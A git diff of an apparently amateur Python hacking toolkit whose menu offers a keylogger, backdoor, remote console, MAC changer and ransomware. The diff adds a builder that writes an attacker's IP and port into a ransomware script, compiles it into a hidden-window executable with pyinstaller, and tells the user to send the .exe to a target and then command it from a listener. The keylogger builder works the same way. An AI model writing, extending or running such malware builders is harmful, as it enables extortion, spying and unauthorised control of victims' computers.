@@ -18,7 +18,7 @@ a = """
 6-)Keyloger from ip
 7-)Backdoor
 8-)connection console
-9-)Ransomware !!!(not for now)!!!
+9-)Ransomware  !!!(not decrypted for now)!!!
 10-)Changemac
 11-)Keylogger Listener
 example: use 1
@@ -86,19 +86,33 @@ def keylogger():
         a=a.replace("psw",password)
     with open("Keylogger/keylogger.py","w") as file:
         file.write(a)
-    sb.call(["pyinstaller","--onefile","-w","keylogger.py"])
+    sb.call(["pyinstaller","--onefile","-w","Keylogger/keylogger.py"])
 
 def Keylog_listen():
     ip = input("enter ipadress: ")
     port = input("enter port number: ")
     keyloggerlistener.listen(ip,port) 
 
+def Ransomware():
+    ip = input("enter your ip adress: ")
+    port = input("enter your  pport number: ")
+    with open("Ransomware/Ransomware.py","r") as file:
+        a = file.read()
+        a=a.replace("0.0.0.0",ip)
+        a=a.replace("4444",port)
+    with open("Ransomware/Ransomware.py","w") as file:
+        file.write(a)
+    sb.call(["pyinstaller","--onefile","-w","Ransomware/Ransomware.py"])
+
 while True:
     print(a)
     user_input = input("input:")
     try:
-        if  user_input == 'use 9':
+        if  user_input == 'use 10':
             change_mac()
+        elif user_input == 'use 9':
+            Ransomware()
+            print("after send .exe extansion file open listener send commannd '1'")
         elif user_input == 'use 11':
             Keylog_listen()
         elif user_input == 'use 6':
@@ -116,7 +130,7 @@ while True:
             sniff()
         elif user_input == 'use 8':
             Listen()
-        elif user_input == 'use 10':
+        elif user_input == 'use 7':
             Backdoor()
         elif user_input == 'use 5':
             keylogger()
